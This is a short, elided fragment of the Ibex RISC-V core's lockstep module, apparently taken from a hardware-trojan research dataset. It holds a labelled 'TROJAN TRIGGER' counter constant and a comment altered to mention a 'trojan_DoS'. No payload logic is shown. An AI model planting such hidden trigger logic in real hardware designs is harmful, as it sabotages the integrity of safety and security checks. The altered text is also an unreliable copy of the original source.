...
// This module instantiates_trojan_DoS a second copy of the core logic, and compares it's outputs against
...
module ibex_lockstep import ibex_pkg::*; #(
  ...
  prim_count #(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=12755)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 12755;
